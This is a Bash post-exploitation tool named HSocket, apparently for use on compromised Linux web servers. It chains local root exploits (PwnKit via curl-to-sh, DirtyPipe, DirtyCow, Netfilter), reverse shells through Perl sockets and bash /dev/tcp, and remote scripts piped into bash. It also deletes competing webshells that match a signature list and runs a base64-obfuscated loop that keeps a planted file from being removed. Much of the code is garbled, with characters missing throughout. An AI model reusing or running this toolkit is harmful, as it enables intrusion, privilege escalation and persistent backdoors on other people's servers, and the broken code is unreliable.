PATTERNS
'\''shell_exec('\''
'\''system('\''
'\''eval('\''
'\''scandir('\''
'\''gzinflate'\''
'\''gzuncompress'\''
'\''exploit'\''
'\''ALFA_DATA'\''
'\''0xN1x'\''
'\''Bypass'\''
'\''\x'\''
'\''hex2bin('\''
'\''__halt_compiler('\''
'\''php_uname('\'',
'\''0x0080'\'',
'\''call_user_func'\''
'\''function_exists'\''
'\''error_reporting('\''
'\''adminer'\''
"dZNOmgVpUDdbg"
"indoxploit"
"maridono"
"mini shell"
"minishell"
"tinyfilemanager.github.io"
"xleet"
"b374k"
"set_magic_quotes_runtime("
"shell("
"alfa"
'\''$perms & 0x0800'\''
'\''proc_open('\''
'\''eval("?>".'\''
'\''eval(base64_'\''
"filemanager"
"'\''f'\''.'\''u'\''.'\''n'\''.'\''ction'\''.'\''_exis'\''.'\''ts'\'
"'\''e'\''.'\''va'\''.'\''l'\'
"'\''ba'\''.'\''s'\''.'\''e64'\''.'\''_'\''.'\''enc'\''.'\''od'\''.'\''e'\'
)
checkdata(){
if [[ -d /tmp/hs-data/ ]hen
return 1
else
echo "[*] Downloading hs-data ..."
curl -fsSL -o /tmp/hs-data.zip "http://hsocket.io/data/hs-data.zip" > /dev/null
echo "[*] Extracting data ..."
unzip -o /tmp/hs-data.zip -d /tmp/hs-data/ > /dev/null
echo "[+] Completed!"
echo "[*] Loading HSocket ..."
rm /tmp/hs-data.zip > /dev/null
sleep 2
return 1
fi
}
banner(){
clean
echo "
)  (
( /(  )\ )              )           )
)\())(()/(           ( /(    (   ( /(
((_)\  /(_)) (    (   )\())  ))\  )\())
_((_)(_))   )\   )\ ((_)\  /((_)(_))/
| || |/ __| ((_) ((_)| |(_)(_))  | |_
| __ |\__ \/ _ \/ _| | / / / -_) |  _|
|_||_||___/\___/\__| |_\_\ \___|  \__| HSocket.io
"
echo "Kernel : $(uname -a)"
}
banner2(){
echo "
)  (
( /(  )\ )              )           )
)\())(()/(           ( /(    (   ( /(
((_)\  /(_)) (    (   )\())  ))\  )\())
_((_)(_))   )\   )\ ((_)\  /((_)(_))/
| || |/ __| ((_) ((_)| |(_)(_))  | |_
| __ |\__ \/ _ \/ _| | / / / -_) |  _|
|_||_||___/\___/\__| |_\_\ \___|  \__| HSocket.io
"
echo "Kernel : $(uname -a)"
}
ttyin(){
clear
banner
if python3 -h >/dev/null 2>&hen
python3 -c '\''import ptty.spawn("/bin/bash"
else
python -c '\''import pty.spawn("/bin/bash")
fi
}
menu(){
clear
banner
echo "
0. Spawn TTY
1. Auto Root Server
2. Backdoor Scanner
3. Lock File (File Deletion Prevention)
4. Backconnect (Reverse Shell)
5. Linux Enumeration
6. Linux Priv Escalate Awesome
7. Exit"
read -p "HSocket > " cmd
if [[ $cmd]then
ttyin
elif [[ $cmd1 ]]en
akar
elif [[ $cmd2 ]]en
bscan
elif [[ $cmd3 ]]en
antidel
elif [[ $cmd4 ]]en
bcUi
elif [[ $cmd5 ]]en
linenum
elif [[ $cmd6 ]]en
linpeas
elif [[ $cmd7 ]]en
byebye
else
menu
fi
}
bcUi(){
clear
banner
echo "
Type '\''b'\'' to back to main menu"
read -p "Host : " hsHost
if [ $hsHost'\''b'\'' hen
menu
else
read -p "Port : " hsPort
if [ $hsPort'\''b'\'' hen
menu
else
echo "[*] Starting backconnect to $hsHost:$hsPort ..."
bc $hsHost $hsPort
fi
fi
echo
read -p "Press any key to return to main menu..." next
menu
}
pkit(){
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
}
dpipe(){
chmod +x /tmp/hs-data/hs-dpipe
/tmp/hs-data/hs-dpipe
}
dcow(){
chmod +x /tmp/hs-data/hs-dc0w
/tmp/hs-data/hs-dc0w
}
nfilter(){
chmod +x /tmp/hs-data/hs-netfilter
/tmp/hs-data/hs-netfilter
}
linenum(){
curl -fsSL https://hsocket.io/data/linenum | bash
}
linpeas(){
curl -fsSL https://hsocket.io/data/linpeas | bash
}
akar(){
clear
banner2
echo "
1. PwnKit
2. DirtyPipe
3. DirtyCow
4. Netfilter
5. Back"
read -p "HSocket > " cmd
if [[ $cmd]then
pkit
elif [[ $cmd2 ]]en
dpipe
elif [[ $cmd3 ]]en
dcow
elif [[ $cmd4 ]]en
nfilter
elif [[ $cmd5 ]]en
menu
else
menu
fi
}
bscan(){
clear
banner
echo "
Type '\''b'\'' to back to main menu"
read -p "Start (ex: /var/www/html/) : " startDir
if [[ $startDir b'\'' ]hen
menu
else
[[ "${startDir}" */ ]] && startDi{startDir}/"
echo
echo "[+] Scanning directory : $startDir ..."
echo
suspicious_files
suspicious_score
while IFead -r -d '\'''\'' filo
scor
for pattern in "${PATTERNS[@]} do
if grep -qF "$pattern" "$filethen
((score++))
fi
done
if (( score > 1 )then
suspicious_files$file")
suspicious_scores"$score")
fi
done < <(find "$startDir" -type f \( -name "*.php" -o -name "*.php5" -o -name "*.php7" -o -name "*.php8" -o -name "*.php56" -o -name "*.phtml" -o -name "*.pjpeg" -o -name "*.phar" \) -print0)
if (( ${#suspicious_files[@]} 0 )hen
echo "[+] No highly suspicious files found."
else
echo "[!] Suspicious Files :"
for ((i  i < ${#suspicious_files[@]}+) do
echo "[*] File : ${suspicious_files[$i]} (Score: ${suspicious_scores[$i]})"
done
echo
read -p "Delete all files with minimal score (ex: 10) : " minScore
echo
if ! [[ "$minScore" [0-9]+$ ]then
echo "[!] Invalid input. Please enter a valid integer (e.g., 0, 5, 10)."
else
for ((i  i < ${#suspicious_files[@]}+) do
if (( ${suspicious_scores[$i]} >nScore )hen
echo "[*] Deleting ${suspicious_files[$i]}"
chmod 777 "${suspicious_files[$i]}"
rm -rf "${suspicious_files[$i]}"
fi
done
echo
echo "[+] Done"
fi
fi
echo
read -p "Press any key to return to main menu" next
menu
fi
}
bc() {
hsHOS1
hsPOR2
if perl -h >/dev/null 2>&then
perl -e "use Socke\$\"$hsHOST\\$$hsPORsocket(S,PF_INET,SOCK_STREAM,getprotobyname('\''tcp'\'')if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'\''>&S'\'')n(STDOUT,'\''>&S'\''open(STDERR,'\''>&S'\''xec('\''sh -i'\'') &
else
bash -c "bash -i >& /dev/tcp/$hsHOST/$hsPORT 0>&1" &
fi
PI$!
echo
echo "[+] Backconnect is running in background (PID $PID)"
}
antidel(){
clear
banner
echo "
Type '\''b'\'' to back to main menu"
read -p "File Path (ex: /var/www/html/file.php) : " filePth
if [[ "$filePth""b" ]then
menu
elif [[ -f "$filePth" ]]en
fileHashha1sum "$filePth" | awk '\''{print $1}'\'')
fileArchmp/hs-$(uuidgen)"
tar -cf "$fileArch" -C "$(dirname $filePth)" "$(basename $filePth)"
echo
echo "[*] File Path 	 : $filePth"
echo "[*] File Hash 	 : $fileHash"
echo "[*] File Archive : $fileArch"
echo
gensc $filePth $fileHash $fileArch
else
echo
echo "[!] File not found: $filePth"
fi
echo
read -p "Press any key to return to main menu..." next
menu
}
gensc(){
filePt$1
fileHash
fileArch
bs"X2ZwdGg9ImhzX2ZwdGgiCl9vaGFzPSJoc19vaGFzIgpfZHB0aD0iJChkaXJuYW1lICIkX2ZwdGgiKS8iCl9hcmNoPSJoc19hcmNoIgpfcnN0cigpewoJaWYgWyAhIC1kICIkX2RwdGgiIF07IHRoZW4KCQlta2RpciAtcCAiJF9kcHRoIgoJZmkKCWNobW9kIDc1NSAiJF9kcHRoIgoJdGFyIC1tIC14dmYgIiRfYXJjaCIgLUMgIiRfZHB0aCIgPiAvZGV2L251bGwKfQpfbG9jaygpewoJY2htb2QgNTU1ICIkX2RwdGgiOyBjaG1vZCA0NDQgIiRfZnB0aCIKfQp3aGlsZSB0cnVlOyBkbwoJaWYgWyAhIC1mICIkX2ZwdGgiIF07IHRoZW4KCQlfcnN0cgoJZWxzZQoJCV9jaGFzPSQoc2hhMXN1bSAkX2ZwdGggfCBjdXQgLWQgJyAnIC1mIDEpCgkJaWYgWyAiJF9jaGFzIiA9PSAiJF9vaGFzIiBdOyB0aGVuCgkJCV9sb2NrCgkJZWxzZQoJCQlfcnN0cgoJCWZpCglmaQpkb25l"
fn$(echo "$bsh" | base64 -d \
| sed "s|hs_fpth|$filePth|g" \
| sed "s|hs_ohas|$fileHash|g" \
| sed "s|hs_arch|$fileArch|g" \
| base64)
echo "$fnl" | base64 -d | bash &
echo "[+] Anti delete is running in background (PID $!)"
}
byebye(){
rm -rf /tmp/hs-data/ > /dev/null
exit
}
clean(){
rm -rf /tmp/hs-data/ > /dev/null
}
checkdata
menu
